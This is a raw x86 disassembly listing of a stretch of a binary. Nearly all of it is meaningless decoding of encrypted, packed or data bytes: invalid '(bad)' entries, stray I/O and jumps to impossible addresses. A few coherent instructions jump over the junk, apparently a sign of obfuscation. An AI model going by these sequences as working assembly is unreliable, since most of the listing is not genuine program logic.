  415992:	push   ebx
  415993:	lahf   
  415994:	xlat   BYTE PTR ds:[ebx]
  415995:	push   edi
  415996:	lods   eax,DWORD PTR ds:[esi]
  415997:	fist   WORD PTR ds:0xf9925288
  41599d:	adc    al,0x1d
  41599f:	aam    0xba
  4159a1:	sahf   
  4159a2:	(bad)
  4159a5:	mov    al,0xd0
  4159a7:	(bad)  
  4159a8:	(bad)  [esi-0x4909657d]
  4159ae:	ret    
  4159af:	aaa    
  4159b0:	xchg   ebx,eax
  4159b1:	aaa    
  4159b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159b3:	sub    al,0xc0
  4159b5:	jno    0x415a1f
  4159b7:	lods   al,BYTE PTR ds:[esi]
  4159b8:	and    esp,DWORD PTR ds:0x9dc32460
  4159be:	popa   
  4159bf:	not    BYTE PTR [ebx+0x1f94533c]
  4159c5:	dec    ecx
  4159c6:	pop    ds
  4159c7:	adc    ebp,DWORD PTR [ebx-0x29a24f80]
  4159cd:	jnp    0x415a05
  4159cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d0:	dec    ebp
  4159d1:	mov    dl,BYTE PTR [eax+ebp*2]
  4159d4:	mov    eax,ds:0x839c7766
  4159d9:	mov    dl,0x6b
  4159db:	sbb    edi,esp
  4159dd:	mov    dh,0x22
  4159df:	pop    esi
  4159e0:	jmp    0xa34e662c
  4159e5:	inc    eax
  4159e6:	fiadd  DWORD PTR [esi+0x2e58be74]
  4159ec:	dec    ebx
  4159ed:	out    dx,eax
  4159ee:	adc    bl,BYTE PTR [ebp-0x12]
  4159f1:	add    eax,0xab66de44
  4159f6:	inc    ebx
  4159f7:	repz cmp DWORD PTR [eax+0x727a3d9f],0x6c
  4159ff:	mov    ch,0xf1
  415a01:	aas    
  415a02:	ins    DWORD PTR es:[edi],dx
  415a03:	pop    ss
  415a04:	add    ebp,DWORD PTR [edi+0x43d0f8d6]
  415a0a:	mov    ?,WORD PTR [esi-0x3a]
  415a0d:	loop   0x415a37
  415a0f:	(bad)  
  415a10:	fidivr DWORD PTR [ebx-0x199e2daa]
  415a16:	stos   BYTE PTR es:[edi],al
  415a17:	lock mov al,ds:0x406d8590
  415a1d:	inc    edi
  415a1e:	push   edi
  415a1f:	sub    al,0x64
  415a21:	stos   BYTE PTR es:[edi],al
  415a22:	test   cl,dl
  415a24:	int3   
  415a25:	pop    esi
  415a26:	xchg   ch,dh
  415a28:	lds    eax,FWORD PTR [esi+0x11d69deb]
  415a2e:	mov    ah,BYTE PTR [edx+edx*8-0x7bcaa2bd]
  415a35:	sub    BYTE PTR [bp+di+0x1a13],0x99
  415a3b:	xchg   esi,eax
  415a3c:	data16 mov dh,0x82
  415a3f:	jbe    0x415aa7
  415a41:	nop
  415a42:	cld    
  415a43:	push   ebx
  415a44:	mov    dh,0x4e
  415a46:	in     al,0x59
  415a48:	xor    eax,esi
  415a4a:	dec    ebp
  415a4b:	pop    esp
  415a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a4d:	sub    DWORD PTR ss:[eax],esi
  415a50:	rcr    BYTE PTR [ebx],0x68
  415a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a54:	push   0xffffffe6
  415a56:	add    cl,ah
  415a58:	pushf  
  415a59:	div    BYTE PTR [edi+0x77]
  415a5c:	ja     0x415a8e
  415a5e:	dec    esp
  415a5f:	jno    0x415a62
  415a61:	xlat   BYTE PTR ds:[ebx]
  415a62:	imul   edi,DWORD PTR [eax-0x1a],0xe252966c
  415a69:	ret    0xce33
  415a6c:	sub    dh,BYTE PTR [edi+0x15ffe438]
  415a72:	mov    BYTE PTR [eax-0x53693d1d],ch
  415a78:	sbb    edi,DWORD PTR [ebx]
  415a7a:	jmp    0xddc6:0xa44fa96b
  415a81:	fs daa 
  415a83:	(bad)  
  415a84:	jbe    0x415a16
  415a86:	(bad)  
  415a87:	jmp    0x415a28
  415a89:	xchg   ecx,eax
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	mov    dh,0x67
  415aa6:	inc    ebx
  415aa7:	test   BYTE PTR [eax-0x468f80f3],bh
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415b09
  415ab1:	xlat   BYTE PTR ds:[ebx]
  415ab2:	and    ebx,DWORD PTR [esp+esi*4-0x15]
  415ab6:	retf   0x45c3
  415ab9:	and    ah,bl
  415abb:	test   al,0xde
  415abd:	xor    BYTE PTR [ecx+0x17bbad04],bh
  415ac3:	(bad)
  415ac6:	fisubr WORD PTR [edi+0x4a]
  415ac9:	cmp    esi,edi
  415acb:	pop    ecx
  415acc:	dec    edx
  415acd:	lods   al,BYTE PTR ds:[esi]
  415ace:	ret    
  415acf:	daa    
  415ad0:	pop    edi
  415ad1:	fist   DWORD PTR [ebp+0x78]
  415ad4:	repnz test DWORD PTR [ebp+0x207920ec],esi
  415adb:	(bad)  
  415adc:	push   DWORD PTR [ebx-0x73]
  415adf:	push   ebx
  415ae0:	pop    esp
  415ae1:	(bad)
  415ae5:	pop    ds
  415ae6:	jns    0x415b67
  415ae8:	mov    ?,WORD PTR [edx+0x110e9b89]
  415aee:	xchg   edi,eax
  415aef:	mov    al,0xa2
  415af1:	test   al,0xea
  415af3:	test   al,0xbc
  415af5:	push   ebp
  415af6:	dec    edx
  415af7:	arpl   WORD PTR [eax+0x6e],si
  415afa:	pop    esi
  415afb:	jae    0x415ab9
  415afd:	push   ebp
  415afe:	sbb    ch,BYTE PTR [edi]
  415b00:	xor    bh,BYTE PTR [ebp+0xe]
  415b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b04:	adc    bl,BYTE PTR [edx+0x28]
  415b07:	imul   edx,DWORD PTR [esi+0x58],0x7111aeb6
  415b0e:	add    esp,esi
  415b10:	sub    edx,0x30191ccd
  415b16:	xlat   BYTE PTR ds:[ebx]
  415b17:	add    eax,0x57e8b598
  415b1c:	sbb    DWORD PTR [edx-0x57],ebx
  415b1f:	sbb    BYTE PTR [ecx-0x1d],ch
  415b22:	fst    QWORD PTR [ecx+0x3dc35ed3]
  415b28:	pop    es
  415b29:	addr16 jge 0x415ae8
  415b2c:	or     ecx,DWORD PTR [edi-0x33]
  415b2f:	pop    ds
  415b30:	xlat   BYTE PTR ds:[ebx]
  415b31:	stc    
  415b32:	aad    0xf6
  415b34:	sbb    DWORD PTR [edx],ebp
  415b36:	gs sub al,0x7b
  415b39:	rcl    bh,cl
  415b3b:	call   0x3bb67ca9
  415b40:	mov    ecx,0x13cdb6b5
  415b45:	pop    ecx
  415b46:	mov    ch,0x96
  415b48:	sbb    al,0xf1
  415b4a:	pop    esi
  415b4b:	sub    esi,ecx
  415b4d:	adc    DWORD PTR [ebx],ebx
  415b4f:	dec    esp
  415b50:	out    0x1a,eax
  415b52:	test   esp,edx
  415b54:	(bad)  
  415b55:	pop    edx
  415b56:	push   edx
  415b57:	loop   0x415b22
  415b59:	mov    ebx,edx
  415b5b:	ins    DWORD PTR es:[edi],dx
  415b5c:	adc    DWORD PTR [esi-0x149cf71b],edx
  415b62:	ds xor eax,0x850eb14a
  415b68:	imul   eax,DWORD PTR [ebx-0xeb9067a],0xe293858d
  415b72:	jo     0x415bd4
  415b74:	icebp  
  415b75:	out    dx,al
  415b76:	pop    ebp
  415b77:	lock (bad) 
  415b7b:	stos   BYTE PTR es:[edi],al
  415b7c:	stos   BYTE PTR es:[edi],al
  415b7d:	repnz sub DWORD PTR [edx-0x78],ecx
  415b81:	std    
  415b82:	jecxz  0x415b70
  415b84:	jl     0x415b48
  415b86:	sub    ecx,eax
  415b88:	sbb    esi,esi
  415b8a:	je     0x415b2d
  415b8c:	mov    ds:0xd9faf2da,eax
  415b91:	inc    ecx
  415b92:	mov    eax,0x1f998417
  415b97:	jecxz  0x415b6b
  415b99:	sbb    edx,DWORD PTR [edi-0x5af36c36]
  415b9f:	data16 addr16 mov ah,0x31
  415ba3:	cmp    BYTE PTR [ecx],bl
  415ba5:	data16 clc 
  415ba7:	push   eax
  415ba8:	and    al,0x1e
  415baa:	popf   
  415bab:	je     0x415bcc
  415bad:	push   esp
  415bae:	xchg   al,ah
  415bb0:	xchg   ebp,eax
  415bb1:	xor    eax,0xbcef99fe
  415bb6:	fwait
  415bb7:	inc    edi
  415bb8:	mov    al,0xf3
  415bba:	inc    DWORD PTR [ebx]
  415bbc:	test   DWORD PTR [ebx+0x76c57d41],eax
  415bc2:	lods   al,BYTE PTR ds:[esi]
  415bc3:	add    DWORD PTR [edx+0x6b],esi
  415bc6:	jecxz  0x415bec
  415bc8:	xchg   ebp,eax
  415bc9:	xor    eax,0xd3f070e6
  415bcf:	dec    esp
  415bd0:	setb   BYTE PTR [ebx-0x75f19d6e]
  415bd7:	inc    edx
  415bd8:	push   cs
  415bd9:	fcom   DWORD PTR [eax-0x59]
  415bdc:	fimul  WORD PTR [ecx]
  415bde:	mov    eax,0xf4f939ef
  415be3:	inc    ecx
  415be4:	(bad)  
  415be5:	(bad)  [esi]
  415be7:	push   eax
  415be8:	aad    0xc9
  415bea:	(bad)  
  415beb:	xchg   ebp,eax
  415bec:	push   edx
  415bed:	sbb    esp,ecx
  415bef:	stos   DWORD PTR es:[edi],eax
  415bf0:	pop    edi
  415bf1:	or     DWORD PTR [ebx+edx*1],ebp
  415bf4:	sbb    DWORD PTR [ecx+0x35],esp
  415bf7:	ds js  0x415bef
  415bfa:	stos   DWORD PTR es:[edi],eax
  415bfb:	mov    esp,DWORD PTR [esi+eiz*1-0x8]
  415bff:	das    
  415c00:	sar    dl,0xb
  415c03:	leave  
  415c04:	dec    esp
  415c05:	(bad)  
  415c06:	clc    
  415c07:	add    dl,BYTE PTR [esi]
  415c09:	jle    0x415bb2
  415c0b:	jnp    0x415c27
  415c0d:	push   esi
  415c0e:	mov    esp,0xa670cdbe
  415c13:	lds    esp,FWORD PTR [edi+0x6c3fbc4d]
  415c19:	inc    edx
  415c1a:	jne    0x415be8
  415c1c:	xchg   DWORD PTR [edx+0x20],ebp
  415c1f:	or     DWORD PTR [ebx+0x54],edx
  415c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c23:	aam    0x81
  415c25:	xchg   esp,eax
  415c26:	je     0x415c69
  415c28:	ffreep st(6)
  415c2a:	sbb    eax,0x56865fc
  415c2f:	push   esp
  415c30:	arpl   WORD PTR [esi],si
  415c32:	repnz sub edx,ebx
  415c35:	in     al,0xa0
  415c37:	pusha  
  415c38:	int3   
  415c39:	add    DWORD PTR [ecx+0x1977aa7],0x20
  415c40:	fwait
  415c41:	xor    edx,DWORD PTR [edx-0x6debf562]
  415c47:	mov    dl,0xb1
  415c49:	nop
  415c4a:	bound  esi,QWORD PTR ds:0x251ba237
  415c50:	push   ss
  415c51:	daa    
  415c52:	xchg   edi,esi
  415c54:	jae    0x415cb0
  415c56:	push   ss
  415c57:	and    DWORD PTR [ebp-0x2e],eax
  415c5a:	cld    
  415c5b:	daa    
  415c5c:	pop    ss
  415c5d:	and    al,0x83
  415c5f:	and    DWORD PTR [ebx],ebp
  415c61:	outs   dx,DWORD PTR ds:[esi]
  415c62:	sbb    esi,DWORD PTR [ebx]
  415c64:	sbb    al,0x98
  415c66:	imul   esp,eax,0x5ce34d59
  415c6c:	inc    ecx
  415c6d:	out    0x32,al
  415c6f:	or     dl,BYTE PTR [esi+0x3b59cc71]
  415c75:	ret    
  415c76:	mov    ah,dh
  415c78:	cwde   
  415c79:	add    esp,eax
  415c7b:	jns    0x415c37
  415c7d:	pop    ebp
  415c7e:	jl     0x415cd0
  415c80:	adc    ebx,DWORD PTR es:[ebp-0x5e]
  415c84:	outs   dx,DWORD PTR ds:[esi]
  415c85:	fldcw  WORD PTR [ebx+edi*4]
  415c88:	or     eax,0x229e20fc
  415c8d:	ret    
  415c8e:	inc    eax
  415c8f:	outs   dx,DWORD PTR ds:[esi]
  415c90:	mov    edi,0x194ebd46
  415c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c96:	iret   
  415c97:	mov    al,ds:0xc98bc356
  415c9c:	cld    
  415c9d:	mov    ebx,esp
  415c9f:	pop    es
  415ca0:	push   es
  415ca1:	loop   0x415cfd
  415ca3:	icebp  
  415ca4:	stos   DWORD PTR es:[edi],eax
  415ca5:	jmp    0xc44d14ee
  415caa:	sub    DWORD PTR [eax+0x311a7bc6],esi
  415cb0:	loope  0x415c7e
  415cb2:	cmp    DWORD PTR [ebx],eax
  415cb4:	stc    
  415cb5:	call   ebp
  415cb7:	sub    DWORD PTR [esi+0x713af47a],esp
  415cbd:	(bad)  
  415cbe:	mov    eax,0xee206246
  415cc3:	xchg   BYTE PTR [ecx-0x11],ah
  415cc6:	add    al,BYTE PTR [ecx+esi*1-0x1c]
  415cca:	cmp    esp,edi
  415ccc:	mov    dh,0x91
  415cce:	das    
  415ccf:	mov    dl,0x43
  415cd1:	xchg   esp,eax
  415cd2:	shl    eax,cl
  415cd4:	dec    ebp
  415cd5:	cmp    ch,dh
  415cd7:	ins    DWORD PTR es:[edi],dx
  415cd8:	or     DWORD PTR [ecx+ecx*4-0x3e],ebp
  415cdc:	js     0x415c80
  415cde:	push   0xffffffa8
  415ce0:	stos   DWORD PTR es:[edi],eax
  415ce1:	in     eax,0x31
  415ce3:	sbb    BYTE PTR [ebp-0x19ff875d],0x16
  415cea:	dec    esi
  415ceb:	aaa    
  415cec:	adc    ebx,edi
  415cee:	dec    eax
  415cef:	push   ecx
  415cf0:	push   edi
  415cf1:	rcr    BYTE PTR [ebx-0x6c],cl
  415cf4:	and    eax,0x829c132e
  415cf9:	add    cl,BYTE PTR [ebp+0x3f9b7130]
  415cff:	jg     0x415cbf
  415d01:	xchg   ebx,eax
  415d02:	popf   
  415d03:	inc    ecx
  415d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d05:	adc    esi,eax
  415d07:	push   edi
  415d08:	mov    ebp,0x490c3b78
  415d0d:	jne    0x415cf6
  415d0f:	pop    ebx
  415d10:	dec    esi
  415d12:	sub    DWORD PTR [edi-0x5f],edi
  415d15:	addr16 dec edx
  415d17:	xchg   ebp,eax
  415d18:	inc    ebx
  415d19:	mov    edi,edi
  415d1b:	sti    
  415d1c:	push   es
  415d1d:	inc    edi
  415d1e:	pop    edi
  415d1f:	pop    edi
  415d20:	out    dx,eax
  415d21:	jg     0x415d5d
  415d23:	fs mov edi,0xb9380737
  415d29:	fisub  WORD PTR [edi]
  415d2b:	out    dx,al
  415d2c:	adc    ecx,ebx
  415d2e:	jb     0x415cc5
  415d30:	dec    esi
  415d31:	sbb    edi,0x4cf864bb
  415d37:	jne    0x415cc1
  415d39:	out    0x8d,al
  415d3b:	call   FWORD PTR [ebx-0x41]
  415d3e:	in     eax,0x41
  415d40:	mov    ds:0xa17267fe,al
  415d46:	clc    
  415d47:	std    
  415d48:	pop    esp
  415d49:	js     0x415cd7
  415d4b:	and    eax,0x20216e85
  415d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d51:	clc    
  415d52:	sbb    DWORD PTR [ecx+0x59],0x4a2621ee
  415d59:	cmp    BYTE PTR [esp+edx*2-0x7f13f9cc],dh
  415d60:	or     eax,0x133c24ec
  415d65:	mov    ecx,DWORD PTR [ebx+edi*1+0x62b5928]
  415d6c:	sub    BYTE PTR [esi],0x7b
  415d6f:	mov    ecx,0x44bf4aa6
  415d74:	push   0xffffff80
  415d76:	into   
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	mov    BYTE PTR [edi+edi*8+0x7f0a8137],ah
  415d9b:	jo     0x415d56
  415d9d:	jle    0x415e0f
  415d9f:	jo     0x415da1
  415da1:	sbb    cl,BYTE PTR [edx+0x40]
  415da4:	ins    DWORD PTR es:[edi],dx
  415da5:	cli    
  415da6:	xor    al,0xac
  415da8:	mov    WORD PTR [ecx+0x30],?
  415dab:	cmp    al,0xb1
  415dad:	and    DWORD PTR [edx+0x5dd6d23e],esi
  415db3:	cdq    
  415db4:	rcl    DWORD PTR [eax-0x2eccfd61],0x20
  415dbb:	inc    eax
  415dbc:	bound  ebp,QWORD PTR [esp-0x77]
  415dc0:	adc    edx,0x34486090
  415dc6:	js     0x415e0e
  415dc8:	add    DWORD PTR [esi+0x13],0x5b2360ec
  415dcf:	adc    eax,0xad91950e
  415dd4:	jnp    0x415dba
  415dd6:	fisttp QWORD PTR [eax+eiz*2]
  415dd9:	mov    DWORD PTR [ecx-0x34],0x3729de6e
  415de0:	test   eax,0xc41d49de
  415de5:	jnp    0x415dc3
  415de7:	rcr    DWORD PTR [ecx-0x6cbeb7f2],1
  415ded:	arpl   WORD PTR [edx+0x5f6e19d9],cx
  415df3:	pusha  
  415df4:	jmp    0xa191d88d
  415df9:	push   esi
  415dfa:	imul   edi,DWORD PTR [ecx+0x66],0x1
  415dfe:	sahf   
  415dff:	cld    
  415e00:	lods   al,BYTE PTR ds:[esi]
  415e01:	fs push esi
  415e03:	fst    DWORD PTR [ecx+0x6b]
  415e06:	or     BYTE PTR [edi+0x5674e99],ch
  415e0c:	add    DWORD PTR [edi+ebx*2-0x1fff2f44],edx
  415e13:	or     BYTE PTR [esp+edi*8],dl
  415e16:	jbe    0x415e71
  415e18:	verw   bx
  415e1b:	rol    BYTE PTR [eax+0x27],cl
  415e1e:	lea    esp,[ecx]
  415e20:	test   dh,ah
  415e22:	out    0xb4,eax
  415e24:	push   edi
  415e25:	in     eax,dx
  415e26:	xchg   ecx,eax
  415e27:	jmp    0x415e70
  415e29:	sbb    eax,0x915a05ad
  415e2e:	xor    eax,ecx
  415e30:	and    BYTE PTR [eax],bh
  415e32:	xchg   ebp,eax
  415e33:	fisttp WORD PTR [edx-0x2e5a6c61]
  415e39:	js     0x415dcb
  415e3b:	mov    ds:0xa2b453d1,al
  415e40:	dec    eax
  415e41:	arpl   WORD PTR [esi],bp
  415e43:	pop    ecx
  415e44:	mov    cl,BYTE PTR [eax+eiz*4-0x4a]
  415e48:	loope  0x415e5c
  415e4a:	mov    esi,DWORD PTR [esp+edx*1+0x7a8b2871]
  415e51:	scas   al,BYTE PTR es:[edi]
  415e52:	test   eax,0x886610ed
  415e57:	es mov ch,0x61
  415e5a:	or     ebx,esi
  415e5c:	cld    
  415e5d:	xor    esp,esp
  415e5f:	popf   
  415e60:	xchg   DWORD PTR [eax-0x20],esi
  415e63:	outs   dx,BYTE PTR ds:[esi]
  415e64:	mov    ds:0xbc5de939,al
  415e69:	jmp    0x9f8c:0xaa67b0fd
  415e70:	(bad)  
  415e72:	in     al,dx
  415e73:	mov    ?,WORD PTR [ecx]
  415e75:	jae    0x415e2d
  415e77:	stos   BYTE PTR es:[edi],al
  415e78:	or     eax,0xaaf9be27
  415e7d:	sbb    esp,DWORD PTR [edi+0x55]
  415e80:	scas   al,BYTE PTR es:[edi]
  415e81:	ins    DWORD PTR es:[edi],dx
  415e82:	repnz inc eax
  415e84:	or     cl,bh
  415e86:	inc    eax
  415e87:	or     dh,0x16
  415e8a:	inc    esi
  415e8b:	dec    ebp
  415e8c:	(bad)  
  415e8d:	pusha  
  415e8e:	call   0x46383dea
  415e93:	loop   0x415ec0
  415e95:	inc    ebx
  415e96:	ret    
  415e97:	push   esi
  415e98:	aas    
  415e99:	xchg   esi,eax
  415e9a:	dec    ecx
  415e9b:	xor    eax,0x3b36dec2
  415ea0:	push   ebx
  415ea1:	in     eax,0x76
  415ea3:	es sub eax,0x12f97b11
  415ea9:	push   eax
  415eaa:	test   BYTE PTR [eax+0x15],al
  415ead:	scas   al,BYTE PTR es:[edi]
  415eae:	mov    BYTE PTR [ecx-0x2333c8d4],0x8b
  415eb5:	push   ebx
  415eb6:	xchg   DWORD PTR [edx+eiz*8-0x3aa313b6],ebx
  415ebd:	lods   al,BYTE PTR ds:[esi]
  415ebe:	call   0xa0b138de
  415ec3:	sub    ch,bh
  415ec5:	mov    dh,0xce
  415ec7:	mov    cl,0xff
  415ec9:	or     al,0x68
  415ecb:	or     eax,0x8c496452
  415ed0:	mov    edi,0xd5f48d05
  415ed5:	xor    BYTE PTR [ebx+0x50],bh
  415ed8:	or     esi,DWORD PTR [eax-0x72e74f3b]
  415ede:	in     eax,0xb7
  415ee0:	and    al,BYTE PTR [edx+edi*4]
  415ee3:	lods   al,BYTE PTR ds:[esi]
  415ee4:	adc    edx,edx
  415ee6:	push   esi
  415ee7:	and    DWORD PTR [edi],eax
  415ee9:	cmp    esp,eax
  415eeb:	xchg   edx,eax
  415eec:	add    dh,BYTE PTR [esi+0x7a]
  415eef:	fxtract 
  415ef1:	push   eax
  415ef2:	cwde   
  415ef3:	push   ds
  415ef4:	cmc    
  415ef5:	sbb    BYTE PTR [ebx+ecx*8-0x7bcf3e1],0xd7
  415efd:	sbb    al,0x7a
  415eff:	xchg   esi,eax
  415f00:	(bad)  
  415f02:	fiadd  DWORD PTR [ebp+0x4da78101]
  415f08:	mov    BYTE PTR [ecx],cl
  415f0a:	pushf  
  415f0b:	dec    ecx
  415f0c:	or     eax,0xd1320346
  415f11:	dec    edi
  415f12:	and    ebp,esp
  415f14:	fisubr WORD PTR [ecx]
  415f16:	or     eax,DWORD PTR gs:[ebp+0x6c573820]
  415f1d:	jmp    0x415f9e
  415f1f:	ret    0x3b09
  415f22:	clc    
  415f23:	cs pop ebp
  415f25:	pop    esi
  415f26:	lea    esi,[ebx+0x7507a51a]
  415f2c:	out    dx,eax
  415f2d:	pop    ebp
  415f2e:	test   eax,0xb4068a34
  415f33:	repnz mov BYTE PTR [edx],dh
  415f36:	mov    ah,0x27
  415f38:	out    0xb2,al
  415f3a:	mov    ds:0x4b49e386,eax
  415f3f:	jmp    0x9bcd:0xc2e21a4
  415f46:	mov    esp,0x6ad1908c
  415f4b:	dec    esp
  415f4c:	cmp    al,bl
  415f4e:	fadd   QWORD PTR [esi-0x5d]
  415f51:	mov    BYTE PTR [edx-0x7780824a],dh
  415f57:	out    dx,al
  415f58:	retf   
  415f59:	scas   eax,DWORD PTR es:[edi]
  415f5a:	jo     0x415f2a
  415f5c:	push   ds
  415f5d:	mov    esp,0x904ac4fd
  415f62:	test   DWORD PTR [eax-0x57],esi
  415f65:	lods   al,BYTE PTR ds:[esi]
  415f66:	repz loopne 0x415f1d
  415f69:	cmp    ecx,DWORD PTR [ebx+0x66]
  415f6c:	pop    ds
  415f6d:	push   ss
  415f6e:	lds    esp,FWORD PTR [eax+0x7f]
  415f71:	dec    edx
  415f72:	(bad)  
  415f73:	loopne 0x415f3e
  415f75:	mov    edx,DWORD PTR [edi+0x4d]
  415f78:	xor    ebx,edx
  415f7a:	fst    QWORD PTR [ebx+0x6f729c18]
  415f80:	retf   
  415f81:	mov    ds:0x5e280ec0,al
  415f86:	in     eax,0x2f
  415f88:	(bad)  [ebx-0x5936cec9]
  415f8e:	and    DWORD PTR [esi-0x4d],edx
  415f91:	and    eax,0xcbbdbfad
  415f96:	pop    ebp
  415f97:	add    DWORD PTR [edx-0x1b6596c7],esi
  415f9d:	dec    edx
  415f9e:	imul   edx,DWORD PTR [esi-0x548617f8],0xd5c5f9aa
  415fa8:	mov    BYTE PTR [edx-0x75],bl
  415fab:	les    eax,FWORD PTR [ecx]
  415fad:	dec    esi
  415fae:	cmp    DWORD PTR ds:0x2ae133ba,esi
  415fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb5:	inc    ebp
  415fb6:	pop    es
  415fb7:	out    dx,al
  415fb8:	je     0x415f4d
  415fba:	loop   0x415f60
  415fbc:	lods   al,BYTE PTR ds:[esi]
  415fbd:	dec    BYTE PTR [esi]
  415fbf:	aaa    
  415fc0:	xchg   ebp,eax
  415fc1:	mov    ah,0xaa
  415fc3:	(bad)  
  415fc5:	and    cl,ah
  415fc7:	mov    dh,0x3c
  415fc9:	hlt    
  415fca:	or     al,0x20
  415fcc:	push   ecx
  415fcd:	and    ebx,esp
  415fcf:	jecxz  0x41600a
  415fd1:	pusha  
  415fd2:	push   ecx
  415fd3:	mov    eax,ds:0xadd19f45
  415fd8:	or     BYTE PTR ds:0x76f277cd,0x9f
  415fdf:	xor    al,0xd9
  415fe1:	jp     0x415f9c
  415fe3:	add    ebx,esp
  415fe5:	lock fidivr WORD PTR [esi+0x4bdf11ec]
  415fec:	or     eax,DWORD PTR [ebp+ebx*1+0x50]
  415ff0:	out    0x59,eax
  415ff2:	retf   
  415ff3:	sub    BYTE PTR [eax+0xb0e47a6],0xfd
  415ffa:	mov    ?,WORD PTR [eax+0x7d]
  415ffd:	mov    ch,0xb5
  415fff:	push   ecx
  416000:	push   esp
  416001:	popw   ss
  416003:	jg     0x416039
  416005:	push   ebp
  416006:	sti    
  416007:	data16 jnp 0x41603d
  41600a:	add    edx,DWORD PTR [esi+0x726b7c6d]
  416010:	(bad)  
  416011:	pop    ecx
  416012:	ja     0x415fac
  416014:	(bad)
  416018:	mov    ah,0xc0
  41601a:	jl     0x415fde
  41601c:	icebp  
  41601d:	mov    al,0xfa
  41601f:	outs   dx,BYTE PTR ds:[esi]
  416021:	inc    edx
  416022:	or     esi,0x8
  416025:	push   es
  416026:	and    bl,BYTE PTR [eax]
  416028:	cwde   
  416029:	push   bx
  41602b:	mov    al,ds:0x35f750ca
  416030:	enter  0xb58d,0xb0
  416034:	push   ebx
  416035:	sbb    al,0x65
  416037:	retf   
  416038:	xchg   esi,eax
  416039:	push   0x609d41f1
  41603e:	xchg   ebx,eax
  41603f:	je     0x416085
  416041:	(bad)  
  416042:	in     al,0x71
  416044:	sub    bh,al
  416046:	jl     0x41602a
  416048:	add    BYTE PTR [ecx-0x6ab1ee36],al
  41604e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41604f:	test   al,0xa5
  416051:	in     al,0xdc
  416053:	jno    0x415fd6
  416055:	scas   al,BYTE PTR es:[edi]
  416056:	sbb    DWORD PTR [edx-0x3e4f628f],0x9878d079
  416060:	in     al,dx
  416061:	xchg   DWORD PTR [ecx],ebp
  416063:	loope  0x416038
  416065:	dec    esi
  416066:	mov    cs,WORD PTR [ebx-0x3eccf7ab]
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160b0
  41609a:	push   0x37
  41609c:	xchg   ebx,eax
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416060
  4160a6:	ss ins BYTE PTR es:[edi],dx
  4160a8:	test   DWORD PTR [edx+0x4b923003],eax
  4160ae:	pop    esp
  4160af:	mov    ah,0xc6
  4160b1:	lods   eax,DWORD PTR ds:[esi]
  4160b2:	ja     0x4160d8
  4160b4:	imul   eax,DWORD PTR [edx+esi*8],0xffffff96
  4160b8:	push   edi
  4160b9:	xor    eax,0xc424cde3
  4160be:	and    bl,bl
  4160c0:	jmp    0x199442cd
  4160c5:	mov    al,ds:0x8f7a3cd9
  4160ca:	cmp    edx,ecx
  4160cc:	xor    al,0x65
  4160ce:	scas   al,BYTE PTR es:[edi]
  4160cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d0:	mov    BYTE PTR [edi-0x7e79852a],dl
  4160d6:	mov    ch,0x4c
  4160d8:	cli    
  4160d9:	and    bh,bh
  4160db:	fisubr WORD PTR [eax]
  4160dd:	ss out 0x4f,al
  4160e0:	mov    ah,0x22
  4160e2:	or     BYTE PTR [esi],dl
  4160e4:	iret   
  4160e5:	cmp    ecx,ebx
  4160e7:	and    BYTE PTR [esp+ecx*2+0x4f32a547],dh
  4160ee:	mov    ds:0x17041c52,eax
  4160f3:	mov    ds:0xc0180a92,eax
  4160f8:	mov    esi,0x28d88854
  4160fd:	std    
  4160fe:	loope  0x416135
  416100:	js     0x416160
  416102:	mov    esi,0x623a928d
  416107:	pop    ebp
  416108:	dec    ebx
  416109:	jmp    0x416135
  41610b:	cmp    ecx,ebx
  41610d:	fadd   QWORD PTR [esi+0x7c]
  416110:	and    ecx,DWORD PTR [edi-0x54]
  416113:	call   0xae479629
  416118:	xchg   esp,eax
  416119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41611a:	pop    ss
  41611b:	fidivr WORD PTR [edi+esi*4]
  41611e:	fild   WORD PTR [ecx+0xc8fcdfe]
  416124:	lds    edx,FWORD PTR [edi]
  416126:	addr16 push eax
  416128:	sub    DWORD PTR [esi],ecx
  41612a:	jmp    0x9c35:0x4d6bd26c
  416131:	sub    BYTE PTR [bx+si+0x78],ch
